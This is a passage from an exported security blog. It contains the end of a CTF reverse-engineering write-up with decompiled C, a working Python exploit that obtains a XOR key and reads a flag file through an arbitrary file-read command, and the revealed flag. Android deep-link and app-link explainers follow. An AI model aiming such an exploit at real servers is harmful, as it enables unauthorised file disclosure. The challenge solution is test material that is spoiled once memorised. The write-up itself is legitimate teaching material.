FUN_00405355(char_ptr_array[1]);\n\t  if (cVar2 == '\\x01') {\n\t\tobj-\u003eundefined_3 = 1;\n\t  }\n\t  else {\n\t\tobj-\u003eundefined_3 = 0;\n\t  }\n\t}\n\telse if (local_154 == 0x41) {\n\t  if (at_least_2 == 3) {\n\t\tlocal_148 = FUN_004ce310(char_ptr_array[2]);\n\t\tlocal_144 = FUN_004053be(\u0026obj-\u003eundefined_3,char_ptr_array[1],local_148);\n\t\tif (local_144 == 0) {\n\t\t  obj-\u003esize = 0;\n\t\t}\n\t\telse {\n\t\t  obj-\u003esize = (uint16_t)local_144;\n\t\t  for (local_150 = 0; local_150 \u003c local_144; local_150 = local_150 + 1) {\n\t\t\tobj-\u003epayload[(long)local_150 + -2] =\n\t\t\t\t obj-\u003epayload[(long)local_150 + -2] ^ stored_value;\n\t\t  }\n\t\t}\n\t  }\n\t  else {\n\t\tobj-\u003esize = 0;\n\t  }\n\t}\n  }\n```\n\nIf `at_least_2` is, *at least* (:}), 2 we have multiple conditional statements on the first retrieved string (at index 0) of `char_ptr_array`. The function `thunk_FUN_004ef8a0` accepts a constant (they all reside inside the `.rodata` section) as the second parameter and the mentioned string as the first. The tree constants are (two of them needs to be converted manually from ghidra into a `string`): stat, read and write. Based on the return value of `iVar3` we are setting `local_154` to `0x40`, `0x41` or `0x42` that are later used inside multiple `if` statements. \n\nIf `local_154` is `0x42`, our previously renamed `may_log` function writes `\"EXEC_WRITE Not implemented\"` and the same for on `0x40` and `0x41` (like a classic `switch` statement) but with the difference that we do not have the `Not implemented` log message. Following the logic of this log function, we can suppose that `EXEC_WRITE` is the source code representation of a command that can be set from the `thunk_FUN_004ef8a0` call with the `write` as a second parameter (since it sets the variable to `0x42`). We can rename `local_154` to `exec_command`.\n\nIf `exec_command` is `0x40` there is a call to `FUN_00405355` that seems to return something similar to a boolean result. If the return result is `0x1`, `obj-\u003eundefined4` is set accordingly and the same for `0x0`.\n\n#### stat - `FUN_00405355`\n```C\nbool FUN_00405355(undefined8 param_1)\n\n{\n  int iVar1;\n  long in_FS_OFFSET;\n  undefined local_a8 [152];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  iVar1 = FUN_00522440(param_1,local_a8);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return iVar1 == 0;\n}\n\n```\n\nThis function is really simple since it just calls one function and returns its value (ignore the `local_10` that is the stack cookie). The called function `FUN_00522440` is the statically linked `stat` function since it clearly calls a syscall with the `EAX` register set to `0x106`(`newfstatat` syscall). The return result of `stat` (and subsequently of `FUN_00405355`) indicates if the file exists or not. We can rename that function to `exec_stat`.\n\n#### read - `FUN_004ce310` \u0026 `FUN_004053be`\nIf the `exec_command` inside `command_0x20` matches `0x41`, the first check is that `at_least_2` is equals to 3 and if it is not we return with `obj-\u003esize` set to zero. Otherwise, we call `FUN_004ce310` with `char_ptr_array[2]` as parameter and the result will be the third parameter of `FUN_004053be` (marked as `int` in the function signature from ghidra). That parameter is later used inside the function `FUN_00522080` that is an `lseek` syscall. The second parameter of `lseek` is an `off_t` (`long int`) type, meaning that ghidra \"guessed\" it pretty correctly.  For that reasons, it seems that from the second index of `char_ptr_array` we are retrieving, in some way, an integer value that we are passing to `FUN_004053be` and using it as an offset to something through `lseek`.\n\n```C\nint FUN_004053be(long param_1,undefined8 param_2,int param_3)\n{\n  int iVar1;\n  long lVar2;\n  \n  iVar1 = FUN_005220d0(param_2,0);\n  if (iVar1 == -1) {\n    iVar1 = 0;\n  }\n  else {\n    lVar2 = lseek(iVar1,(long)param_3,0);\n    if (lVar2 == -1) {\n      iVar1 = 0;\n    }\n    else {\n      iVar1 = FUN_005223a0(iVar1,param_1,0xff);\n      *(undefined *)(param_1 + iVar1) = 0;\n    }\n  }\n  return iVar1;\n}\n```\n\nFunction `FUN_004053be` is called with `obj-\u003eundefined_3` as the first parameter and `char_ptr`array as the second one. \n\n`FUN_005220d0` is a call to the `openat` syscall, meaning that we are opening the file at `param_2` as read-only. Let's rename it into `filename` and retype to `char*`. If `openat` succeeds, `lseek` is called with the offset specified by `param_3` (renamed to `offset`) on the opened file handle. It then proceeds to call `FUN_005223a0` (\"proxy\" function to the `read` syscall) with the `param_1` (that is `obj-\u003eundefined3`) as the `char* buf` parameter.  That means that inside `obj-\u003eundefined3` there is the content of the read file at the specified offset.\nThis the cleaned code:\n```C\nint exec_open(long param_1,char *filename,int offset)\n{\n  int fp;\n  long lVar1;\n  \n  fp = openat(filename,0);\n  if (fp == -1) {\n    fp = 0;\n  }\n  else {\n    lVar1 = lseek(fp,(long)offset,0);\n    if (lVar1 == -1) {\n      fp = 0;\n    }\n    else {\n      fp = read(fp,param_1,0xff);\n      *(undefined *)(param_1 + fp) = 0;\n    }\n  }\n  return fp;\n}\n```\n\nThe return result is the `read` return value (number of read bytes) and the value, at `command_0x20` function, is stored inside `obj-\u003esize`. It follows a `for` loop that XOR each character inside the `obj-\u003epayload` with the previously retrieved `stored_value`.  However, we can see a strange array access: `obj-\u003epayload[(long)local_150 + -2]`. `local_150`, the `for` loop index initialized with zero,  is used to access `-2` bytes before the array memory location? What a strange behavior.. or, maybe, we have made wrong assumptions before. Maybe the array starts 2 bytes before?\n\nLet's re-think a little bit by re-watching our current struct definition:\n\n![[notes/images/rev/4.png]]\n\n`payload[-2]` indicates `undefined_3`. We have set it due to the usage and the retrieval of a specific size in the offset of `calculated_size` and we still didn't know the value of the byte before (=\u003e`undefined_3`) but:\n- Arguments (for example to the identified `exec_open` function) are dynamically generated into a local array (`char_ptr_array`) so the payload stores both the size (that is sanitized) and the content.\n- `undefined_3` is used as the direct buffer output of the `read` syscall.\n- The `for` loop starts the xoring operation two indexes before the current definition (`-2`).\n\nFor that reasons, let's try to remove `undefined_3` and `calculated_size` by replacing them with two extra bytes for `payload` instead:\n\n![[notes/images/rev/5.png]]\n\nWith that change, the code seems far more congruent and readable.\n\n### Chain all pieces\nAfter this intensive Reverse Engineering phase, we have recovered a much more understandable code (that you can find at the end [[#Appendix Cleaned code]]) with ideas on how the program works:\n- The client message must contain a well-defined structure with a constant value at the beginning, a command and the size of the entire message.\n- The command `0x10` sets a value that can be retrieved from the command `0x20`. This value is later used to XOR the content of the message like a basic encryption mechanism.\n- The command `0x20`, after few validation checks, parses an array of arguments dynamically and is able to execute few extra operations: read, write and stat.\n- The write operation is not implemented, while the stat is able to identify existing files and the read operation to read arbitrary files.\n- The read operation, from the command `0x20`, can be exploited in order to read the flag at `/home/pwnx/flag.txt` (as instructed in the webroot at port 80).\n\nTo solve the challenge, it is necessary to initializes a session that returns a xoring key. The retrieved key is used to \"encrypt\" a further message that contains a read operation to the `/home/pwnx/flag.txt` file.  The final python exploit can be found [here TODO](TODO).\n\n## libc signature resolution alternative\nAn alternative solution to retrieve function signatures for statically linked libc functions is to use something like [IDA FLIRT](https://docs.hex-rays.com/user-guide/signatures/flirt) or its [Ghidra ApplySig](https://github.com/NWMonster/ApplySig) alternative. This approach is well explained from Liveoverflow in the following video: [Reversing Statically-Linked Binaries with Function Signatures](https://www.youtube.com/watch?v=CgGha_zLqlo).\n## Conclusion\nHope you have enjoyed this RE journey. In the next blog post we are going to release the write-up for the binary exploitation challenge too that involves a custom allocator specifically written for that challenge! Stay tuned and happy hacking!\n\n## Appendix\n### The cleaned code\n```C\nvoid parse_client_message(int socket)\n\n{\n  long lVar1;\n  char res;\n  int bytes_received;\n  undefined8 uVar2;\n  long in_FS_OFFSET;\n  struct custom_message undefined_obj;\n  char buffer [264];\n  \n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\n  thunk_FUN_004ef5e0(buffer,0,0x108);\n  bytes_received = recvfrom(socket,buffer,0x108,0);\n  if (bytes_received \u003c 0) {\n    uVar2 = may_log(\u0026DAT_005caba0,\"Error reading from socket\");\n    jmp_rsi(uVar2,FUN_00476340);\n    close(socket);\n  }\n  else {\n    init_obj(\u0026undefined_obj);\n    res = copy_from_buffer(\u0026undefined_obj,buffer,(long)bytes_received);\n    if (res == '\\x01') {\n      FUN_00406018(\u0026undefined_obj);\n      if (undefined_obj.command == 0x10) {\n        command_0x10(\u0026undefined_obj);\n      }\n      else if (undefined_obj.command == 0x20) {\n        command_0x20(\u0026undefined_obj);\n      }\n      else {\n        undefined_obj.size = 0;\n      }\n      sendto(socket,\u0026undefined_obj,(ulong)undefined_obj.size + 8,0);\n    }\n    else {\n      uVar2 = may_log(\u0026DAT_005caba0,\"Invalid message received\");\n      jmp_rsi(uVar2,FUN_00476340);\n    }\n  }\n  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n\nvoid command_0x10(struct custom_message *obj)\n\n{\n  int iVar1;\n  ushort *puVar2;\n  byte bVar3;\n  long in_FS_OFFSET;\n  ushort obj_undefined;\n  long stack_cookie;\n  \n  stack_cookie = *(long *)(in_FS_OFFSET + 0x28);\n  obj_undefined = *(ushort *)obj-\u003exor_key_derivate;\n  if ((obj_undefined \u003c 0x100) || (0x900 \u003c obj_undefined)) {\n    obj-\u003esize = 0;\n  }\n  else {\n    iVar1 = return_something();\n    bVar3 = (char)iVar1 + (char)(iVar1 / 0x3f) * -0x3f;\n    puVar2 = (ushort *)store_and_get(\u0026DAT_005c9d80,\u0026obj_undefined);\n    *puVar2 = (ushort)bVar3;\n    obj-\u003esize = 2;\n    obj-\u003epayload[0] = 0x1;\n    obj-\u003epayload[1] = bVar3;\n  }\n  if (stack_cookie != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return;\n}\n\n\nvoid command_0x20(struct custom_message *obj)\n\n{\n  long lVar1;\n  byte stored_value;\n  char cVar2;\n  int iVar3;\n  undefined2 *puVar4;\n  undefined8 uVar5;\n  long in_FS_OFFSET;\n  undefined2 local_168;\n  ushort memcpy_size;\n  int memcpy_source_offset;\n  int at_least_2;\n  int idx;\n  int inner_idx;\n  int exec_command;\n  int local_150;\n  undefined4 local_14c;\n  undefined4 local_148;\n  int n_bytes;\n  char *memcpy_dest;\n  char *char_ptr_array [16];\n  \n  lVar1 = *(long *)(in_FS_OFFSET + 0x28);\n  local_168 = *(undefined2 *)obj-\u003exor_key_derivate;\n  puVar4 = (undefined2 *)store_and_get(\u0026DAT_005c9d80,\u0026local_168);\n  stored_value = (byte)*puVar4;\n  if (stored_value == 0) {\n    obj-\u003esize = 0;\n  }\n  else {\n    local_14c = 3;\n    char_ptr_array[0] = (char *)0x0;\n    char_ptr_array[1] = (char *)0x0;\n    char_ptr_array[2] = (char *)0x0;\n    memcpy_size = 0;\n    memcpy_source_offset = 0;\n    memcpy_dest = (char *)0x0;\n    at_least_2 = 0;\n    idx = 0;\n    while ((((idx \u003c 3 \u0026\u0026\n             (memcpy_size = (ushort)obj-\u003epayload[memcpy_source_offset],\n             (int)(uint)memcpy_size \u003c= 0xff - memcpy_source_offset)) \u0026\u0026 (memcpy_size \u003c obj-\u003esize))\n           \u0026\u0026 (memcpy_size != 0))) {\n      memcpy_dest = (char *)malloc(memcpy_size + 1);\n      memcpy_dest[memcpy_size] = '\\0';\n      memcpy(memcpy_dest,obj-\u003epayload + (long)memcpy_source_offset + 1,memcpy_size);\n      for (inner_idx = 0; inner_idx \u003c (int)(uint)memcpy_size; inner_idx = inner_idx + 1) {\n        memcpy_dest[inner_idx] = memcpy_dest[inner_idx] ^ stored_value;\n      }\n      char_ptr_array[idx] = memcpy_dest;\n      at_least_2 = at_least_2 + 1;\n      memcpy_source_offset = memcpy_source_offset + memcpy_size + 1;\n      idx = idx + 1;\n    }\n    if (at_least_2 \u003c 2) {\n      obj-\u003esize = 0;\n    }\n    else {\n      exec_command = 0;\n      iVar3 = what_is_this(char_ptr_array[0],\"stat\");\n      if (iVar3 == 0) {\n        exec_command = 0x40;\n      }\n      iVar3 = what_is_this(char_ptr_array[0],\"read\");\n      if (iVar3 == 0) {\n        exec_command = 0x41;\n      }\n      iVar3 = what_is_this(char_ptr_array[0],\"write\");\n      if (iVar3 == 0) {\n        exec_command = 0x42;\n      }\n      local_148 = 0;\n      if (exec_command == 0x42) {\n        uVar5 = may_log(\u0026DAT_005cacc0,\"EXEC_WRITE Not implemented\");\n        jmp_rsi(uVar5,FUN_00476340);\n      }\n      else if (exec_command \u003c 0x43) {\n        if (exec_command == 0x40) {\n          obj-\u003esize = 1;\n          cVar2 = exec_stat(char_ptr_array[1]);\n          if (cVar2 == 0x1) {\n            obj-\u003epayload[0] = '\\x01';\n          }\n          else {\n            obj-\u003epayload[0] = '\\0';\n          }\n        }\n        else if (exec_command == 0x41) {\n          if (at_least_2 == 3) {\n            local_148 = FUN_004ce310(char_ptr_array[2]);\n            n_bytes = exec_open(obj-\u003epayload,char_ptr_array[1],local_148);\n            if (n_bytes == 0) {\n              obj-\u003esize = 0;\n            }\n            else {\n              obj-\u003esize = (uint16_t)n_bytes;\n              for (local_150 = 0; local_150 \u003c n_bytes; local_150 = local_150 + 1) {\n                obj-\u003epayload[local_150] = obj-\u003epayload[local_150] ^ stored_value;\n              }\n            }\n          }\n          else {\n            obj-\u003esize = 0;\n          }\n        }\n      }\n    }\n  }\n  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_check();\n}\n\n\nbool exec_stat(undefined8 param_1)\n\n{\n  int ret;\n  long in_FS_OFFSET;\n  undefined local_a8 [152];\n  long local_10;\n  \n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  ret = stat(param_1,local_a8);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_check();\n  }\n  return ret == 0;\n}\n\nint exec_open(long param_1,char *filename,int offset)\n\n{\n  int fp;\n  long lVar1;\n  \n  fp = openat(filename,0);\n  if (fp == -1) {\n    fp = 0;\n  }\n  else {\n    lVar1 = lseek(fp,(long)offset,0);\n    if (lVar1 == -1) {\n      fp = 0;\n    }\n    else {\n      fp = read(fp,param_1,0xff);\n      *(undefined *)(param_1 + fp) = 0;\n    }\n  }\n  return fp;\n}\n```\n\n### Exploit\n```python\nfrom struct import *\nimport socket\nimport sys\nimport hashlib\nfrom termcolor import colored\n\ndef print_info(str):\n    print(colored(\"[*] \" + str,\"cyan\"))\ndef print_ok(str):\n    print(colored(\"[+] \"+ str,\"green\"))\ndef print_error(str):\n    print(colored(\"[-] \"+ str,\"red\"))\ndef print_warning(str):\n    print(colored(\"[!!] \" + str,\"yellow\"))\n\nchar = \"x\"\nsigned_char = s_char = \"b\"\nunsigned_char = u_char = \"B\"\n_Bool = _bool = \"?\"\nshort_int = s_int = \"h\"\nunsigned_short_int = u_s_int = \"H\"\n_int = \"i\"\nunsigned_int = u_int = \"I\"\nlong_int = l_int = \"l\"\nunsigned_long_int = u_l_int = \"L\"\nlong_long_int = l_l_int = \"q\"\nunsigned_long_long_int = u_l_l_int = \"Q\"\n_float = \"f\"\n_double = \"d\"\nchar_array = \"s\"\nvoid = \"P\"\n\ndef get_byte(num):\n    return pack(\"\u003cB\", num)\n\ndef get_word(num):\n    return pack(\"\u003cH\", num)\n\ndef get_dword(num):\n    return pack(\"\u003cL\", num)\n\ndef get_qword(num):\n    return pack(\"\u003cQ\", num)\n\ndef eazy_unpack(format_list, data):\n    # THe first one must be little/big endian ot newtork or what else\n    # Give back struct format from a list\n    form = \"\"\n    print(\"[eazy_struct] size of data: \" + str(len(data)))\n    for ff in format_list:\n        form += ff \n    \n    try:\n        res = unpack(form, data)\n        return list(res)\n    except Exception as ez:\n        print(\"Exception generated: \" + str(ez))\n        return -1\n\nclass Packet():\n    def __init__(self):\n        self.header = Header()\n    def get(self):\n        # Get the packet in bytes to send\n        final_packet = bytearray()\n        # Put the header inside the packet\n        for item in vars(self.header):\n            item_value = getattr(self.header, item)\n            if item_value is None:\n                print_warning(\"[Packet.get] Item \" + item + \" is None\")\n                return -1\n            final_packet += item_value\n        # Put the body inside the packet\n        \"\"\"\"\n        for item in vars(self.body):\n            item_value = getattr(self.body, item)\n            if item_value is None:\n                print_warning(\"[Packet.get] Item \" + item + \" is None\")\n                return -1\n            final_packet += item_value\n        \"\"\"\n        return final_packet\n\n# Define packet structure below\nclass Header:\n    def __init__(self):\n        self.magic_value = None\n        self.session_id = None\n        self.command = None\n        self.unused = None\n        self.body_size = None\n        self.body_args = None\n\ndef send_packet_hello(sock):\n    p = Packet()\n\n    p.header.magic_value    = get_word(0xff66)\n    p.header.session_id     = get_word(0x101)\n    p.header.command        = get_byte(0x10)\n    p.header.unused         = get_byte(0x44)\n    p.header.body_size      = get_word(200)\n    p.header.body_args      = bytearray([0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41])\n    \n    packet = p.get()\n\n    ff = open(\"/tmp/req1\",\"wb\")\n    ff.write(packet)\n    ff.close()\n\n    print(\"[*] Sending ..\")\n    sock.send(packet)\n    print(\"[*] Receiving ..\")\n    res = sock.recv(0x100)\n\n    ff = open(\"/tmp/res1\",\"wb\")\n    ff.write(res)\n    ff.close()\n    \n    # retrieve the encryption key\n    enc_key = res[9]\n    return enc_key\n\ndef encrypt_string(string, enc_key):\n    xor_result = ''.join(chr(ord(char) ^ enc_key) for char in string)\n    return xor_result\n\ndef decrypt_string(string_bytes, enc_key):\n    res = \"\"\n    for v_byte in string_bytes:\n        res += chr(v_byte ^ enc_key)\n\n    return res\n\ndef send_packet_exec(sock, enc_key):\n    p = Packet()\n\n    p.header.magic_value    = get_word(0xff66)\n    p.header.session_id     = get_word(0x101)\n    p.header.command        = get_byte(0x20)\n    p.header.unused         = get_byte(0x01)\n\n    # Create the encrypted arguments body\n    pp                      = \"read\"\n    payload                 = chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    pp                      = \"/home/pwnx/flag.txt\"\n    payload                 += chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    pp                      = \"0\"\n    payload                 += chr(len(pp))\n    payload                 += encrypt_string(pp, enc_key)\n\n    encrypted_body          = bytearray(payload.encode(\"utf-8\"))\n    p.header.body_size      = get_word(len(encrypted_body))\n    p.header.body_args      = encrypted_body\n    \n    packet = p.get()\n\n    ff = open(\"/tmp/req2\",\"wb\")\n    ff.write(packet)\n    ff.close()\n\n    sock.send(packet)\n    res = sock.recv(0x100)\n    file_content = decrypt_string(res[8:], enc_key)\n    print(\"[*] File content: \" + file_content)\n\n    ff = open(\"/tmp/res2\",\"wb\")\n    ff.write(res)\n    ff.close()\n\nif __name__ == \"__main__\":\n    if len(sys.argv) \u003c 2:\n        print_error(\"Needed parameters\")\n        sys.exit()\n\n    target = sys.argv[1]\n    port = int(sys.argv[2])\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target,port))\n\n    enc_key = send_packet_hello(sock)\n    print(\"[+] Encryption key found: \" + hex(enc_key))\n    # reconnect\n    sock.close()\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((target,port))\n    send_packet_exec(sock, enc_key)\n\n```\n\nResult:\n```bash\n$ python3 exploit.py \u003cip\u003e \u003cport\u003e\n[*] Sending ..\n[*] Receiving ..\n[+] Encryption key found: 0x2e\n[*] File content: PWNX{67ef535c2d1a5eea75b21091bd5d2e18eedf9f5c5abd61aa73b0110522666ab3}\n```","lastmodified":"2025-04-14T13:32:05.602086006Z","tags":null},"/notes/Android-Deep-Dive-Deep-and-App-Linking":{"title":"Android Deep Dive - Deep and App Linking","content":"\n## Introduction\nIn the previous blog post we have covered some internal parts of the codebase that are involved in the intent registration and resolution process. In this one we are going to deepen Deep and App Link resolutions in the Android Operating System and its remote Attack Surface. Deep and App Links are data components that permit to associate a specific link to a specific app component. In order to further detail their usage across the Android system, let's start with a Deep Link introduction.\n## Deep Link\nSuppose that you are an app developer and you want to make some of your android app components reachable from an external source (e.g. a browser or another application), and you want an \"universal\" and standard solution: that's where Deep Links come in place! For example, you can have a link like `privateapp://app/login?username=user` that can be called anywhere (almost) and leads to your application execution logic. Moreover, you have a standard approach that you can use to register an arbitrary schema, host and path and you can also pass and receive parameters like a classic web URL. Deep Links are declared in the `AndroidManifest.xml` application file with an `\u003cintent-filter\u003e` declaration inside the targeted component (that can be an activity, service, receiver or provider). The following declaration can match the previously mentioned example:\n\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"privateapp\"/\u003e\n\t\t\u003cdata android:host=\"app\"/\u003e\n\t\t\u003cdata android:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nAs can be seen the `android:scheme`, `android:host` and `android:path` attributes (more attributes can be found in the [documentation](https://developer.android.com/guide/topics/manifest/data-element)) of the `\u003cdata\u003e` tag are used to register the specific URI to handle. Another common approach is to use a single `\u003cdata\u003e` tag, but seems discouraged from the official documentation:\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"privateapp\"\n\t\t\tandroid:host=\"app\"\n\t\t\tandroid:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nThe internal classification, as explained in the previous blog post, is of type `Schemes` but can also contains some MIME types and fall inside other categorizations too (that can be enumerated with `dumpsys package`).\n\n### Actions and Categories\nAn important aspect of a Deep Link reachability is the declared actions and categories. Not all deep links are intended to be reachable from anywhere but an interesting behaviour is that the link can dropped \"anywhere\" (e.g. in a browser inside the `\u003ca\u003e` element) and a click into it will results into an **implicit intent** sent from the browser to the android system, that will take care of the resolution to the appropriate destination (as explained in the first article). For that reason, actions and categories have a fundamental role:\n- [`ACTION_VIEW`](https://developer.android.com/reference/android/content/Intent#ACTION_VIEW): The VIEW action is the default action that is sent if a link is clicked from an `\u003ca\u003e` element or a button from web page. It is useful to be specified inside the `intent-filter` declaration if the intention is to reach the link from a simple click.\n- [`CATEGORY_BROWSABLE`](https://developer.android.com/reference/android/content/Intent#CATEGORY_BROWSABLE): The BROWSABLE category is necessary to reach the intent from a web browser (e.g. chrome). When a browser interacts with the `ActivityManager` system service, it asks for the resolution of the desired deep link by also specifying the required `CATEGORY_BROWSABLE` category in the requested `intent` parameter (the second parameter of the `IntentResolver::queryIntent` method). If the targeted intent filter does not match that category, the resolution fails and never happen.\n- [`CATEGORY_DEFAULT`](https://developer.android.com/reference/android/content/Intent#CATEGORY_DEFAULT): The DEFAULT category is necessary to the application to respond to implicit intents, as specified in the [documentation](https://developer.android.com/training/app-links/deep-linking).\n\nWhile `BROWSABLE` and `DEFAULT` are mandatory for the implicit resolution process, the action is not that strictly necessary. The default `VIEW` action is meant for direct link access (e.g. `privateapp://app/login?username=user` inside an `\u003ca\u003e` element) but it's also possible to use the `intent://` approach.\n\n### `intent://` and `parse_uri`\nBrowsers with android support (e.g. google chrome) can use a special syntax: `intent://`. This syntax, that can be used in a web page as a normal link, permits to launch android app components (that match the `BROWSABLE` and `DEFAULT` categories) directly from a web browser, just like a simpler direct deep link. The [chrome documentation](https://developer.chrome.com/docs/android/intents) details it and uses the following as an URI template:\n```java\nintent:  \n   HOST/URI-path // Optional host  \n   #Intent;  \n      package=\\[string\\];  \n      action=\\[string\\];  \n      category=\\[string\\];  \n      component=\\[string\\];  \n      scheme=\\[string\\];  \n   end;\n```\n\nFor example, the previous `privateapp://app/login?username=user` can be `intent://app/login#Intent;scheme=privateapp;end` and perform the same operation. However, one of the main difference is the required action. While a direct deep link requires the target component to have the `ACTION_VIEW` declared and can only trigger that action, the `intent://` scheme permits to call arbitrary actions based on the `action` parameter. For example, the intent `intent://app/login#Intent;scheme=privateapp;action=android.action.ARBITRARY_ACT;end` launches the same intent but with the action `android.action.ARBITRARY_ACT` instead of the default VIEW one. The logic behind this intent creation from an URI can be found in the [`Intent::parseUri`](https://cs.android.com/android/platform/superproject/+/android-14.0.0_r37:frameworks/base/core/java/android/content/Intent.java;l=7921) method and, as can be seen from the source code, it is possible to specify different options like categories, target package name, extras, data and so on.\n\n## App Link\nApp Links are the same as Deep Links but with a major difference: they are associated with a domain. Instead of the `privateapp://app/login?username=user` we can have `https://mypersonal.website.com/login?username=user` that is entirely the same as a classic URL that can be navigated from a web browser but, if the application is installed and the intent filter registered, it permits to continue the navigation to the mobile application, with a better user experience from a mobile point of view. So, an App Link declaration can looks like this:\n```xml\n\u003cactivity android:name=\".TargetLoginActivity\"\u003e\n\t\u003cintent-filter autoVerify=\"true\"\u003e\n\t\t\u003caction android:name=\"android.intent.action.VIEW\"\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n\t\t\u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n\t\t\u003cdata android:scheme=\"https\"/\u003e\n\t\t\u003cdata android:host=\"mypersonal.website.com\"/\u003e\n\t\t\u003cdata android:path=\"login\"/\u003e\n\t\u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nSimilar to the previously described deep link but with one crucial difference: the `android:scheme` is either `http` or `https`. In order to associate a specific application to an arbitrary domain, a verification through the [Digital Asset Links](https://developers.google.com/digital-asset-links) is required. Without this verification, the App Link is not trusted and it is not possible to use it. An `assetlinks.json` must be created for that purpose in the target domain, as well explained in the [Verify Android App Links](https://developer.android.com/training/app-links/verify-android-applinks) documentation. For debugging purposes, it is possible to verify App Links through `adb shell pm set-app-links --package com.app.example 1 all` and verify its validation with `adb shell pm get-app-links com.app.example` (the constant should be `1` to be verified).\n\n## Browser perspective\nFrom a browser perspective (e.g. chrome in this overview), intents delivered through deep and app links are requested to a preliminary call to the IPC method `queryIntentActivities` of the `PackageManager` service. If an intent matches, with all requested attributes and the `BROWSABLE` category, the intent is delivered  using `startActivity` from the `ActivityTaskManager` system service. Since the intent matching is performed with `queryIntentActivities`, resolved components can be only activities.\n\n## Linkify\nAn interesting android class related to Deep and App Links is [`Linkify`](https://developer.android.com/reference/android/text/util/Linkify): it uses regular expressions to transform a piece of text into clickable links.\n\n```java\ntextView.setText(\"Contat us at info@mail.com or call +1234567890\");\nLinkify.addLinks(textView, Linkify.EMAIL_ADDRESSES | Linkify.PHONE_NUMBERS);\n```\n\nThe \"linkified\" version of the provided text will generates two clickable links: the e-mail and the phone number. They are both replaced with the system deep link default handler (e.g. `mailto://` and `tel:` for the phone number) in order to send an implicit intent with that scheme. It is possible, in Android 14, to linkify web urls, e-mail addresses, phone numbers and map addresses. The Linkify code is at [`Linkify.java`](https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/text/util/Linkify.java;l=99;drc=a78d762ccdbcb1f8f40f2c860caca75ade5d486b) file and represent an interesting behaviour that can be used and abused from third-party apps (e.g. messaging apps).\n\n## Fragment Deeplinks\nFragments are commonly used as portions in the Android UI and can be linked to Deep and App Links also if they cannot be exported as normal components. The process of creating a deep link for a fragment is described in the [Android documentation](https://developer.android.com/guide/navigation/design/deep-link) and the main logic is that a \"fragment navigation\" resource XML file is created and linked to a specific activity through the `\u003cnav-graph\u003e` element:\n```xml\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e\n\u003cmanifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.example.myapplication\"\u003e\n    \u003capplication ... \u003e\n        \u003cactivity name=\".MainActivity\" ...\u003e\n            \u003cnav-graph android:value=\"res/nav_graph.xml\" /\u003e\n        \u003c/activity\u003e\n    \u003c/application\u003e\n\u003c/manifest\u003e\n```\n\nThe `res/nav_graph.xml` contains a Deep Link declaration that is tied to a specific fragment and follows the usual Deep and App link declaration style:\n```xml\n\u003cfragment android:id=\"@+id/a\"\n          android:name=\"com.example.myapplication.FragmentA\"\n          tools:layout=\"@layout/a\"\u003e\n        \u003cdeepLink app:uri=\"www.example.com\"\n                app:action=\"android.intent.action.MY_ACTION\"\n                app:mimeType=\"type/subtype\"/\u003e\n\u003c/fragment\u003e\n```\n\nHowever, they key part is that the `\u003cdeepLink\u003e` element, at build time, is transformed into a classic `\u003cintent-filter\u003e` of the activity that holds the `\u003cnav-graph\u003e` declaration (with the appropriate action and categories). That means that, when the application is compiled, the `\u003cintent-filter\u003e` declaration is the same of a \"classic\" one.\n\n## Conclusion\nIn this two part series we have covered intent implicit resolution, deep linking and the browser perspective. While assessing the Attack Surface of an Android mobile application, it is crucial to have a solid understanding of these key internal concepts and components.\n\n## References\n- https://developer.android.com/guide/topics/manifest/data-element\n- https://developer.android.com/training/app-links/deep-linking\n- https://developer.chrome.com/docs/android/intents\n- https://developer.android.com/guide/navigation/design/deep-link","lastmodified":"2025-04-14T13:32:05.602086006Z","tags":null},"/notes/Android-Deep-Dive-Implicit-Intents":{"title":"Android Deep Dive - Implicit Intents","content":"\n## Introduction\nFrom the official [Android documentation](https://developer.android.com/reference/android/content/Intent), the `Intent` is described as “an abstract description of an operation to be performed”. Conceptually, it can be simplified as an “intention to do something with another application” across Inter-Process Communication (IPC). One of the most interesting facility that intents offer is the implicit resolution. An application can explicitly declare to handle specific 